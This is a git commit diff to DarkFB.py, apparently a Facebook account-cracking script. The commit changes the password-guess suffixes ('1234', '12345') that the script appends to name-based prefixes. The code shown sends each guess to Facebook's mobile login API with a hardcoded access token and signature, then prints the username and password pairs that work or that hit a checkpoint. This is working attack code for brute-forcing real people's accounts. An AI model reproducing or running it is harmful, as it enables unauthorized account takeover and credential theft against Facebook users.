7b0c622aad41c0a6ff9d44040effab3453278f68
JeelsBoobz <38210868+JeelsBoobz@users.noreply.github.com>
2019-06-29 00:20:03 +0700

    Update DarkFB.py

--- DarkFB.py
+++ DarkFB.py
@@ -641,7 +641,7 @@ def pilih_super():
                     if 'www.facebook.com' in q['error_msg']:
                         print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                     else:
-                        pass2 = ckp + '12345'
+                        pass2 = ckp + '1234'
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
@@ -650,7 +650,7 @@ def pilih_super():
                             if 'www.facebook.com' in q['error_msg']:
                                 print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                             else:
-                                pass3 = ckp + '123'
+                                pass3 = ckp + '12345'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
